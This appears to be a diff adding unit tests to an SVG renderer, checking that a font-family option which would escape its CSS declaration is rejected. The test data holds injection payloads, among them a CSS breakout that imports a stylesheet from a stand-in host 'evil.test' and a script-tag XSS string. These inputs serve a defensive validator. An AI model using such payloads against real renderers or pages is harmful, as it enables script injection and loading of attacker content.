@@ -42,6 +42,25 @@ describe('the document', () => {
       'font-family:Iosevka;'
     );
     expect(() => renderSvg(new CellBuffer(1, 1), { ...OPTS, fontFamily: ' ' })).toThrow(TypeError);
+    expect(
+      renderSvg(new CellBuffer(1, 1), { ...OPTS, fontFamily: '"Fira Code", mono-1.0' })
+    ).toContain('font-family:"Fira Code", mono-1.0;');
+  });
+
+  it('should refuse a font stack that would reach past its declaration', () => {
+    // review round 1: a `;` or a `}` ends the declaration, and what follows is
+    // a rule -- an `@import` an SVG opened in a browser fetches
+    for (const fontFamily of [
+      "Iosevka; } @import 'https://evil.test/x.css'; text { font-family: Iosevka",
+      'x</style><script>alert(1)</script>',
+      'a{}',
+      'url(x)',
+      'a\\b',
+    ]) {
+      expect(() => renderSvg(new CellBuffer(1, 1), { ...OPTS, fontFamily }), fontFamily).toThrow(
+        TypeError
+      );
+    }
   });
 });
 
